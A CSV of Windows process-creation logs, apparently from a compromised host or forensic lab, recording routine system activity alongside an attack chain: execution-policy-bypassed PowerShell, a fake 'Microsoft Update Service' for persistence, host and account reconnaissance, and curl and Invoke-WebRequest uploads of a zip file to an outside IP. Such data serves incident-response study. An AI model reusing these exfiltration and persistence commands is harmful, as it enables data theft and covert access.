Timestamp,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessParentFileName
"Sep 16, 2025 2:59:17 PM",taskhostw.exe,taskhostw.exe Install $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 2:59:19 PM",taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 2:59:20 PM",cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 2:59:23 PM",sdiagnhost.exe,sdiagnhost.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 2:59:23 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,sdiagnhost.exe,sdiagnhost.exe -Embedding,svchost.exe
"Sep 16, 2025 3:01:18 PM",DeviceCensus.exe,"""devicecensus.exe"" UserCxt",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:01:40 PM",DismHost.exe,dismhost.exe {7358A319-49EE-410B-A0E9-3FD0A67D4FFB},cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe
"Sep 16, 2025 3:02:43 PM",smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:04:35 PM",FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:05:54 PM",taskhostw.exe,"taskhostw.exe ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:06:04 PM",net.exe,"""net.exe"" user",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:06:05 PM",net1.exe,net1 user,net.exe,"""net.exe"" user",powershell.exe
"Sep 16, 2025 3:12:33 PM",smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:14:36 PM",FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:16:43 PM",powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,userinit.exe
"Sep 16, 2025 3:16:44 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:17:01 PM",TextInputHost.exe,"""TextInputHost.exe"" -ServerName:InputApp.AppXk0k6mrh4r2q0ct33a9wgbez0x7v9cz5y.mca",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:17:02 PM",dllhost.exe,DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:17:02 PM",dllhost.exe,DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:17:06 PM",notepad.exe,notepad.exe,explorer.exe,Explorer.EXE,userinit.exe
"Sep 16, 2025 3:17:43 PM",notepad.exe,notepad.exe,explorer.exe,Explorer.EXE,userinit.exe
"Sep 16, 2025 3:20:37 PM",powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,userinit.exe
"Sep 16, 2025 3:20:37 PM",powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,userinit.exe
"Sep 16, 2025 3:20:37 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:20:37 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:22:30 PM",FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:22:32 PM",dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:23:17 PM",rundll32.exe,"rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:23:56 PM",notepad.exe,"""NOTEPAD.EXE"" C:\Windows\System32\LogFiles\WMI\wmi_maintenance.txt",explorer.exe,Explorer.EXE,userinit.exe
"Sep 16, 2025 3:26:22 PM",powershell_ise.exe,"""powershell_ise.exe"" ""C:\Windows\System32\LogFiles\WMI\wmi_maintenance.ps1""",explorer.exe,Explorer.EXE,userinit.exe
"Sep 16, 2025 3:32:31 PM",smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:38:40 PM",msupdate.exe,"""msupdate.exe"" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 ",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:38:40 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,msupdate.exe,"""msupdate.exe"" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 ",powershell.exe
"Sep 16, 2025 3:38:42 PM",whoami.exe,whoami.exe,msupdate.exe,"""msupdate.exe"" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 ",powershell.exe
"Sep 16, 2025 3:39:45 PM",cmd.exe,"""cmd.exe"" /c ""sc.exe create ""MSUpdateService"" binPath= ""powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1"" DisplayName= ""Microsoft Update Service"" start= auto""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:39:45 PM",sc.exe,"sc.exe  create ""MSUpdateService"" binPath= ""powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1"" DisplayName= ""Microsoft Update Service"" start= auto",cmd.exe,"""cmd.exe"" /c ""sc.exe create ""MSUpdateService"" binPath= ""powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1"" DisplayName= ""Microsoft Update Service"" start= auto""",powershell.exe
"Sep 16, 2025 3:39:45 PM",cmd.exe,"""cmd.exe"" /c ""sc.exe description ""MSUpdateService"" ""Provides automated Microsoft product updates and synchronization""""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:39:45 PM",sc.exe,"sc.exe  description ""MSUpdateService"" ""Provides automated Microsoft product updates and synchronization""",cmd.exe,"""cmd.exe"" /c ""sc.exe description ""MSUpdateService"" ""Provides automated Microsoft product updates and synchronization""""",powershell.exe
"Sep 16, 2025 3:40:28 PM",cmd.exe,"""cmd.exe"" /c systeminfo",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:40:28 PM",systeminfo.exe,systeminfo,cmd.exe,"""cmd.exe"" /c systeminfo",powershell.exe
"Sep 16, 2025 3:40:34 PM",cmd.exe,"""cmd.exe"" /c ""whoami /all""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:40:34 PM",whoami.exe,whoami  /all,cmd.exe,"""cmd.exe"" /c ""whoami /all""",powershell.exe
"Sep 16, 2025 3:40:35 PM",cmd.exe,"""cmd.exe"" /c ""net user""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:40:35 PM",net.exe,net  user,cmd.exe,"""cmd.exe"" /c ""net user""",powershell.exe
"Sep 16, 2025 3:40:36 PM",net1.exe,net1  user,net.exe,net  user,cmd.exe
"Sep 16, 2025 3:40:37 PM",cmd.exe,"""cmd.exe"" /c ""net localgroup administrators""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:40:37 PM",net.exe,net  localgroup administrators,cmd.exe,"""cmd.exe"" /c ""net localgroup administrators""",powershell.exe
"Sep 16, 2025 3:40:37 PM",net1.exe,net1  localgroup administrators,net.exe,net  localgroup administrators,cmd.exe
"Sep 16, 2025 3:40:38 PM",cmd.exe,"""cmd.exe"" /c ""ipconfig /all""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:40:38 PM",ipconfig.exe,ipconfig  /all,cmd.exe,"""cmd.exe"" /c ""ipconfig /all""",powershell.exe
"Sep 16, 2025 3:40:39 PM",cmd.exe,"""cmd.exe"" /c ""netstat -ano""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:40:39 PM",NETSTAT.EXE,netstat  -ano,cmd.exe,"""cmd.exe"" /c ""netstat -ano""",powershell.exe
"Sep 16, 2025 3:40:41 PM",cmd.exe,"""cmd.exe"" /c ""tasklist /svc""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:40:41 PM",tasklist.exe,tasklist  /svc,cmd.exe,"""cmd.exe"" /c ""tasklist /svc""",powershell.exe
"Sep 16, 2025 3:40:42 PM",cmd.exe,"""cmd.exe"" /c ""wmic computersystem get domain""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:40:42 PM",WMIC.exe,wmic  computersystem get domain,cmd.exe,"""cmd.exe"" /c ""wmic computersystem get domain""",powershell.exe
"Sep 16, 2025 3:40:44 PM",cmd.exe,"""cmd.exe"" /c ""query user""",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:40:44 PM",query.exe,query  user,cmd.exe,"""cmd.exe"" /c ""query user""",powershell.exe
"Sep 16, 2025 3:40:44 PM",quser.exe,quser.exe,query.exe,query  user,cmd.exe
"Sep 16, 2025 3:42:04 PM",taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:42:04 PM",cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:42:45 PM",smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:43:11 PM",ngentask.exe,"""NGenTask.exe"" /StopEvent:1408",ngentask.exe,"""NGenTask.exe"" /RuntimeWide /StopEvent:2052",taskhostw.exe
"Sep 16, 2025 3:43:11 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,ngentask.exe,"""NGenTask.exe"" /StopEvent:1408",ngentask.exe
"Sep 16, 2025 3:43:12 PM",ngentask.exe,"""NGenTask.exe"" /StopEvent:1320",ngentask.exe,"""NGenTask.exe"" /RuntimeWide /StopEvent:2004",taskhostw.exe
"Sep 16, 2025 3:43:12 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,ngentask.exe,"""NGenTask.exe"" /StopEvent:1320",ngentask.exe
"Sep 16, 2025 3:43:20 PM",cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:43:20 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",powershell.exe
"Sep 16, 2025 3:43:21 PM",curl.exe,"curl  -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",powershell.exe
"Sep 16, 2025 3:43:28 PM",cmd.exe,"""cmd.exe"" /c powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",powershell.exe,powershell.exe,explorer.exe
"Sep 16, 2025 3:43:28 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /c powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",powershell.exe
"Sep 16, 2025 3:43:28 PM",powershell.exe,"powershell  -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",cmd.exe,"""cmd.exe"" /c powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",powershell.exe
"Sep 16, 2025 3:43:35 PM",SecurityHealthHost.exe,SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:43:43 PM",taskhostw.exe,"taskhostw.exe ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:44:38 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:46:13 PM",taskhostw.exe,taskhostw.exe Install $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:46:13 PM",cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:46:13 PM",TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:46:15 PM",dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:46:30 PM",DismHost.exe,dismhost.exe {A456061A-6E36-43C1-BBF6-9B3F96B96271},cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe
"Sep 16, 2025 3:46:45 PM",OneDriveStandaloneUpdater.exe,"""OneDriveStandaloneUpdater.exe"" /reporting",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:46:54 PM",TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:46:55 PM",rdpclip.exe,rdpclip,svchost.exe,svchost.exe -k NetworkService,services.exe
"Sep 16, 2025 3:46:56 PM",taskhostw.exe,"taskhostw.exe ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:46:59 PM",dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:47:01 PM",taskhostw.exe,taskhostw.exe KEYROAMING,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:47:26 PM",dllhost.exe,DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:47:48 PM",TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:47:50 PM",dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 3:47:52 PM",taskhostw.exe,taskhostw.exe KEYROAMING,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 3:57:47 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 4:13:28 PM",dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 4:41:34 PM",AppHostRegistrationVerifier.exe,AppHostRegistrationVerifier.exe,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 4:43:51 PM",taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 4:44:38 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 4:57:47 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 5:44:38 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 5:57:47 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 6:26:40 PM",PhoneExperienceHost.exe,"""PhoneExperienceHost.exe"" -ComServer:Background -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 6:44:38 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 6:57:47 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 7:29:18 PM",taskhostw.exe,taskhostw.exe Install $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 7:29:18 PM",cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 16, 2025 7:29:35 PM",DismHost.exe,dismhost.exe {ED5C93EB-464B-4E4B-8CEE-25C2829C886C},cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe
"Sep 16, 2025 7:58:44 PM",BraveUpdate.exe,"""BraveUpdate.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 8:13:08 PM",dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 16, 2025 11:01:19 PM",MusNotificationUx.exe,MusNotificationUx.exe QueryNotificationState,musnotification.exe,MusNotification.exe,svchost.exe
"Sep 20, 2025 7:42:04 PM",dllhost.exe,DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:04 PM",TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:05 PM",rdpclip.exe,rdpclip,svchost.exe,svchost.exe -k NetworkService,services.exe
"Sep 20, 2025 7:42:06 PM",sihost.exe,sihost.exe,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 20, 2025 7:42:06 PM",svchost.exe,svchost.exe -k UnistackSvcGroup,services.exe,services.exe,wininit.exe
"Sep 20, 2025 7:42:07 PM",taskhostw.exe,taskhostw.exe USER,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 20, 2025 7:42:07 PM",cmd.exe,"""cmd.exe"" /c calc.exe",svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 20, 2025 7:42:07 PM",taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 20, 2025 7:42:07 PM",taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 20, 2025 7:42:08 PM",ctfmon.exe,ctfmon.exe,svchost.exe,svchost.exe -k LocalSystemNetworkRestricted -p,services.exe
"Sep 20, 2025 7:42:12 PM",userinit.exe,userinit.exe,winlogon.exe,winlogon.exe,smss.exe
"Sep 20, 2025 7:42:12 PM",explorer.exe,Explorer.EXE,userinit.exe,userinit.exe,winlogon.exe
"Sep 20, 2025 7:42:18 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /c calc.exe",svchost.exe
"Sep 20, 2025 7:42:23 PM",svchost.exe,svchost.exe -k ClipboardSvcGroup -p,services.exe,services.exe,wininit.exe
"Sep 20, 2025 7:42:24 PM",dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:27 PM",backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:30 PM",RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:32 PM",StartMenuExperienceHost.exe,"""StartMenuExperienceHost.exe"" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:35 PM",RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:37 PM",taskhostw.exe,taskhostw.exe SyncFromCloud,svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 20, 2025 7:42:38 PM",calc.exe,calc.exe,cmd.exe,"""cmd.exe"" /c calc.exe",svchost.exe
"Sep 20, 2025 7:42:40 PM",SearchApp.exe,"""SearchApp.exe"" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:42 PM",wlrmdr.exe, -c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty,winlogon.exe,winlogon.exe,smss.exe
"Sep 20, 2025 7:42:43 PM",RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:47 PM",backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXe9cvj1thv1hmcw0cs98xm3r97tyzy2xs.mca",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:47 PM",backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXapskvk16gk8da8kch5g4qxh42vxccved.mca",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:47 PM",backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:ShellFeedsUI.AppXnj65k2d1a1rnztt2t2nng5ctmk3e76pn.mca",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:51 PM",backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:53 PM",mobsync.exe,mobsync.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:54 PM",backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:55 PM",RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:57 PM",backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXapskvk16gk8da8kch5g4qxh42vxccved.mca",svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:42:58 PM",smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,services.exe
"Sep 20, 2025 7:43:01 PM",SecurityHealthSystray.exe,SecurityHealthSystray.exe,explorer.exe,Explorer.EXE,userinit.exe
"Sep 20, 2025 7:43:03 PM",powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,userinit.exe
"Sep 20, 2025 7:43:03 PM",powershell.exe,"""powershell.exe"" -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1""",explorer.exe,Explorer.EXE,userinit.exe
"Sep 20, 2025 7:43:03 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,explorer.exe
"Sep 20, 2025 7:43:04 PM",OneDrive.exe,"""OneDrive.exe"" /background",explorer.exe,Explorer.EXE,userinit.exe
"Sep 20, 2025 7:43:04 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,"""powershell.exe"" -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1""",explorer.exe
"Sep 20, 2025 7:43:06 PM",BraveUpdateCore.exe,BraveUpdateCore.exe,explorer.exe,Explorer.EXE,userinit.exe
"Sep 20, 2025 7:43:09 PM",cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""",explorer.exe,Explorer.EXE,userinit.exe
"Sep 20, 2025 7:43:09 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""",explorer.exe
"Sep 20, 2025 7:43:10 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /c",braveupdatecore.exe,BraveUpdateCore.exe,explorer.exe
"Sep 20, 2025 7:43:11 PM",cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\StandaloneUpdater\OneDriveSetup.exe""",explorer.exe,Explorer.EXE,userinit.exe
"Sep 20, 2025 7:43:13 PM",conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\StandaloneUpdater\OneDriveSetup.exe""",explorer.exe
"Sep 20, 2025 7:43:14 PM",notepad.exe,"""notepad.exe"" RestartByRestartManager:E9A22518-3672-4661-B651-A6479274E986",explorer.exe,Explorer.EXE,userinit.exe
"Sep 20, 2025 7:43:15 PM",powershell_ise.exe,powershell_ise.exe,explorer.exe,Explorer.EXE,userinit.exe
"Sep 20, 2025 7:43:17 PM",taskhostw.exe,taskhostw.exe $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,services.exe
"Sep 20, 2025 7:43:21 PM",BraveUpdate.exe,"""BraveUpdate.exe"" /cr",braveupdate.exe,"""BraveUpdate.exe"" /c",BraveUpdateCore.exe
"Sep 20, 2025 7:43:22 PM",BraveCrashHandler.exe,BraveCrashHandler.exe,braveupdate.exe,"""BraveUpdate.exe"" /c",BraveUpdateCore.exe
"Sep 20, 2025 7:43:23 PM",rundll32.exe,"rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh",svchost.exe,svchost.exe -k wsappx -p,services.exe
